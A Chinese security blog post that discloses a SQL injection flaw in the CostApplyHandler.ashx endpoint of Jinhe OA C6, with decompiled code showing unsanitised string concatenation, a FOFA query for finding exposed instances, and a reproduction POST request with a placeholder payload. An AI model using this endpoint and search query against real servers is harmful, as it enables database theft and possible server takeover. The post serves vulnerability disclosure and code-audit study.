---
title: "金和OA CostApplyHandler.ashx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-CostApplyHandler-sqli.html
asset_dir: assets/金和oa-costapplyhandler.ashx-sql注入漏洞
---

# 金和OA CostApplyHandler.ashx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/12/16 13:29
* 326浏览
* [0评论](#comment)
* 36分钟阅读

深入探索

软件

数据库

服务器


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `CostApplyHandler.ashx` 接口处存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞，攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入检测工具

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

根据 `CostApplyHandler.ashx` 的源码，在 `bin` 目录下查找 `JHBase.Web.CostControl.dll` 将其进行反编译后找到 **CostApplyHandler** 的处理逻辑

```
public void ProcessRequest(HttpContext context)
{
  context.Response.ContentType = "text/plain";
  string str = context.Request["action"];
  if (string.IsNullOrEmpty(str))
    return;
  switch (str)
  {
    case "Amount":
      this.GetAmount(context);
      break;
    case "YeahChange":
      this.GetPeriod(context);
      break;
    case "GetAppID":
      this.GetAppID(context);
      break;
    case "ShengChange":
      this.GetSHI(context);
      break;
    case "CostApply_Export":
      this.ExportData(context);
      break;
    case "GetDeptName":
      this.GetDepAlltName(context);
      break;
    case "GetItemName":
      this.GetItemName(context);
      break;
    case "GetJE":
      this.GetTotalJE(context);
      break;
    case "GetBZAmount":
      this.GetBZAmount(context);
      break;
    case "CheckObj":
      this.CheckObj(context);
      break;
    case "IsParent":
      this.CheckIsParent(context);
      break;
    case "CheckForMoney":
      this.CheckForMoney(context);
      break;
    case "GetTravelAppID":
      this.GetTravelAppID(context);
      break;
    case "IsParentFeeItem":
      this.GetIsParent(context);
      break;
    case "GetAllDepartmentName":
      this.GetAllDepName(context);
      break;
    case "AppSumMoney":
      this.GetAppSumMoney(context);
      break;
    case "CheckForTravelExpend":
      this.GetCheckForTravel(context);
      break;
    case "CheckForCostExpend":
      this.GetCheckForCost(context);
      break;
    case "CostAppSumMoney":
      this.GetCostAppSumMoney(context);
      break;
    case "GetSubjectID":
      this.GetSubjectIDByItemCode(context);
      break;
    case "GetDeptByUserID":
      this.GetDeptByUserID(context);
      break;
    case "getUserCostBorrower":
      this.GetUserCostBorrower(context);
      break;
    case "DelTempImp":
      this.DelTempImp(context);
      break;
    case "SaveVouch":
      this.VouchSave(context);
      break;
    case "GetFlowDealUsers":
      this.GetFlowDealUsers(context);
      break;
    case "UseExpendMoney":
      this.IsUseExpendMoney(context);
      break;
  }
}
```

根据**action**的值进入不同的处理流程

代码安全审计

以 `action=YeahChange` 为例，`yeah`被带入GetPeriodByYear方法

```
protected void GetPeriod(HttpContext context)
{
  string str1 = string.Empty;
  DataTable periodByYear = this.cc.GetPeriodByYear(context.Request["yeah"]);
......
protected void GetPeriod(HttpContext context)
{
  string str1 = string.Empty;
  DataTable periodByYear = this.cc.GetPeriodByYear(context.Request["yeah"]);
```

跟进 `GetPeriodByYear` 方法

```
public DataTable GetPeriodByYear(string Year)
{
  return this.db.ExecSQLReDataTable($"{" Select distinct Budget_PeriodManage.Period " + " from Budget_PeriodManage " + " Left outer join Budget_PeriodDivert " + " on Budget_PeriodDivert.YearPeriod = Budget_PeriodManage.YearPeriod " + " and  Budget_PeriodDivert.Period = Budget_PeriodManage.Period "} where Budget_PeriodDivert.Status is null and Budget_PeriodManage.YearPeriod ='{Year}'" + " order by Period asc ");
}
```

非常明显的直接将`yeah`参数拼接进SQL语句执行，从而造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

其他处理类似，就不赘述了。

漏洞扫描服务

# 漏洞复现

```
POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/CostApplyHandler.ashx HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/x-www-form-urlencoded

action=YeahChange&yeah=SQLI_POC
```

[![金和OA CostApplyHandler.ashx SQL注入漏洞](images/img-001-b03784b6f14e.webp)](https://image.mrxn.net/c9bef9726e7d44039eb6bda7515e3a4a.webp)

成功延时 4 秒

计算机服务器

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA CostApplyHandler.ashx SQL注入漏洞](https://mrxn.net/jswz/jhsoft-CostApplyHandler-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-CostApplyHandler-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-CostApplyHandler-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

编程

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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